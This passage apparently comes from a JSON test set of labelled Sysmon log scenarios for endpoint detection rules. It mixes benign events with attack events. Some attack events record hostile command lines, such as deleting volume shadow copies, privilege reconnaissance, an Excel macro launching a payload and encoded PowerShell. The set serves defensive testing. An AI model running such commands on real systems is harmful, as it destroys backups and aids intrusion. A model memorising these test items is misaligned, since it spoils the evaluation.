    "category": "suspicious_file_creation",
    "desc": "IIS web server creates executable file in temp directory",
    "expected_rule": "ENDPOINT-005",
    "events": [
      {
        "timestamp": "2026-10-08T10:03:40+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E11-2000-1791453820",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "w3wp.exe",
        "parent_process": null,
        "process_id": 2000,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_file_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "File Create: C:\\Windows\\Temp\\webshell_agent.exe by w3wp.exe (PID: 2000)",
        "raw_reference": "C:\\Windows\\Temp\\webshell_agent.exe",
        "raw_log": "{\"EventID\": 11, \"Image\": \"C:\\\\Windows\\\\System32\\\\inetsrv\\\\w3wp.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-024",
    "ground_truth": "ATTACK",
    "category": "suspicious_process_execution",
    "desc": "Ransomware pre-execution: vssadmin deletes volume shadow copies",
    "expected_rule": "ENDPOINT-001",
    "events": [
      {
        "timestamp": "2026-10-08T10:03:50+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-4600-1791453830",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "vssadmin.exe",
        "parent_process": "cmd.exe",
        "process_id": 4600,
        "parent_process_id": 4590,
        "command_line": "vssadmin delete shadows /all /quiet",
        "image_path": "C:\\Windows\\System32\\vssadmin.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: vssadmin.exe (PID: 4600) by cmd.exe (PPID: 4590)",
        "raw_reference": "GUID-E1-4600",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\vssadmin.exe\", \"CommandLine\": \"vssadmin delete shadows /all /quiet\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-025",
    "ground_truth": "ATTACK",
    "category": "suspicious_process_execution",
    "desc": "Reconnaissance: whoami /priv executed to enumerate user privileges",
    "expected_rule": "ENDPOINT-001",
    "events": [
      {
        "timestamp": "2026-10-08T10:04:00+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-4610-1791453840",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "whoami.exe",
        "parent_process": "cmd.exe",
        "process_id": 4610,
        "parent_process_id": 4590,
        "command_line": "whoami /priv",
        "image_path": "C:\\Windows\\System32\\whoami.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: whoami.exe (PID: 4610) by cmd.exe (PPID: 4590)",
        "raw_reference": "GUID-E1-4610",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\whoami.exe\", \"CommandLine\": \"whoami /priv\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-026",
    "ground_truth": "ATTACK",
    "category": "suspicious_parent_child",
    "desc": "Nginx web server spawns interactive PowerShell shell",
    "expected_rule": "ENDPOINT-002",
    "events": [
      {
        "timestamp": "2026-10-08T10:04:10+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-4700-1791453850",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "powershell.exe",
        "parent_process": "nginx.exe",
        "process_id": 4700,
        "parent_process_id": 2500,
        "command_line": "powershell.exe -NoExit",
        "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: powershell.exe (PID: 4700) by nginx.exe (PPID: 2500)",
        "raw_reference": "GUID-E1-4700",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"powershell.exe -NoExit\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-VAL-001",
    "ground_truth": "BENIGN",
    "category": "legitimate_powershell",
    "desc": "PowerShell Get-Process command run by IT admin",
    "events": [
      {
        "timestamp": "2026-10-08T10:05:00+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-5100-1791453900",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "powershell.exe",
        "parent_process": "explorer.exe",
        "process_id": 5100,
        "parent_process_id": 1024,
        "command_line": "powershell.exe Get-Process | Sort-Object CPU -Descending",
        "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: powershell.exe (PID: 5100) by explorer.exe (PPID: 1024)",
        "raw_reference": "GUID-E1-5100",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"powershell.exe Get-Process | Sort-Object CPU -Descending\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "validation",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-VAL-002",
    "ground_truth": "BENIGN",
    "category": "normal_dns",
    "desc": "Browser resolves azure.microsoft.com",
    "events": [
      {
        "timestamp": "2026-10-08T10:05:10+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E22-3100-1791453910",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "msedge.exe",
        "parent_process": null,
        "process_id": 3100,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": "portal.azure.com",
        "dns_response": "40.89.244.237",
        "event_type": "sysmon_dns_query",
        "event_category": "endpoint",
        "severity": "low",
        "message": "DNS Query: portal.azure.com by msedge.exe (PID: 3100)",
        "raw_reference": "portal.azure.com",
        "raw_log": "{\"EventID\": 22, \"Image\": \"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "validation",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-VAL-003",
    "ground_truth": "BENIGN",
    "category": "normal_network",
    "desc": "Chrome connects to web server port 80",
    "events": [
      {
        "timestamp": "2026-10-08T10:05:20+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E3-5200-1791453920",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "chrome.exe",
        "parent_process": null,
        "process_id": 5200,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "file_hash": null,
        "source_ip": "10.0.0.15",
        "destination_ip": "198.51.100.22",
        "source_port": 53001,
        "destination_port": 80,
        "protocol": "tcp",
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_network_connection",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Network Connection: chrome.exe (PID: 5200) 10.0.0.15:53001 -> 198.51.100.22:80 (tcp)",
        "raw_reference": "GUID-E3-5200",
        "raw_log": "{\"EventID\": 3, \"Image\": \"C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "validation",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-VAL-004",
    "ground_truth": "BENIGN",
    "category": "normal_file_create",
    "desc": "Word autosaves document in user AppData folder",
    "events": [
      {
        "timestamp": "2026-10-08T10:05:30+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E11-3400-1791453930",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "WINWORD.EXE",
        "parent_process": null,
        "process_id": 3400,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_file_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "File Create: C:\\Users\\jsmith\\AppData\\Local\\Microsoft\\Office\\UnsavedFiles\\report.asd by WINWORD.EXE (PID: 3400)",
        "raw_reference": "C:\\Users\\jsmith\\AppData\\Local\\Microsoft\\Office\\UnsavedFiles\\report.asd",
        "raw_log": "{\"EventID\": 11, \"Image\": \"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "validation",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-VAL-005",
    "ground_truth": "BENIGN",
    "category": "normal_process_tree",
    "desc": "Explorer launches cmd.exe interactively",
    "events": [
      {
        "timestamp": "2026-10-08T10:05:40+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-5300-1791453940",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "cmd.exe",
        "parent_process": "explorer.exe",
        "process_id": 5300,
        "parent_process_id": 1024,
        "command_line": "cmd.exe /k cd C:\\Users\\jsmith",
        "image_path": "C:\\Windows\\System32\\cmd.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: cmd.exe (PID: 5300) by explorer.exe (PPID: 1024)",
        "raw_reference": "GUID-E1-5300",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"CommandLine\": \"cmd.exe /k cd C:\\\\Users\\\\jsmith\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "validation",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-VAL-006",
    "ground_truth": "ATTACK",
    "category": "suspicious_process_execution",
    "desc": "PowerShell with -EncodedCommand parameter",
    "expected_rule": "ENDPOINT-001",
    "events": [
      {
        "timestamp": "2026-10-08T10:05:50+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-6100-1791453950",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "powershell.exe",
        "parent_process": "cmd.exe",
        "process_id": 6100,
        "parent_process_id": 5300,
        "command_line": "powershell.exe -encodedcommand ZQBjAGgAbwAgACIASABhAGMAawBlAGQAIgA=",
        "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: powershell.exe (PID: 6100) by cmd.exe (PPID: 5300)",
        "raw_reference": "GUID-E1-6100",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"powershell.exe -encodedcommand ZQBjAGgAbwAgACIASABhAGMAawBlAGQAIgA=\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "validation",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-VAL-007",
    "ground_truth": "ATTACK",
    "category": "suspicious_parent_child",
    "desc": "Excel macro spawns command prompt cmd.exe",
    "expected_rule": "ENDPOINT-002",
    "events": [
      {
        "timestamp": "2026-10-08T10:06:00+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-6200-1791453960",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "cmd.exe",
        "parent_process": "EXCEL.EXE",
        "process_id": 6200,
        "parent_process_id": 3600,
        "command_line": "cmd.exe /c start payload.exe",
        "image_path": "C:\\Windows\\System32\\cmd.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: cmd.exe (PID: 6200) by EXCEL.EXE (PPID: 3600)",
        "raw_reference": "GUID-E1-6200",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"CommandLine\": \"cmd.exe /c start payload.exe\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "validation",
    "events_count": 1
  },
